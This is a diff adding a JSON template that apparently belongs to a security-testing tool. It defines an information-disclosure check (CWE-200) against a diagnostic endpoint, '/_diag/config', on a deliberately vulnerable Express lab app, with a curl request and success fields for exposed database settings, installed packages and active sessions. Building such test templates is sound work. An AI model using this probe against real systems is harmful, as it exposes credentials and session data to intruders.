@@ -1,0 +1,41 @@
+{
+  "templateId": "diag-config-leak",
+  "attackType": {
+    "name": "info_disclosure",
+    "cwe": "CWE-200"
+  },
+  "dependency": {
+    "runtime": "node",
+    "framework": "express"
+  },
+  "target": {
+    "method": "GET",
+    "endpoint": "/_diag/config",
+    "application": "vul-web2-daehan"
+  },
+  "request": {
+    "curl": "curl -s '{{origin}}/_diag/config'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:4101"
+    }
+  },
+  "payloads": [],
+  "verify": {
+    "mode": "fieldsPresent",
+    "fields": [
+      "database",
+      "installedPackages",
+      "activeSessions"
+    ]
+  },
+  "executor": "repeater",
+  "mutating": false,
+  "origin": "human_authored",
+  "source": "team",
+  "trust": "confirmed"
+}
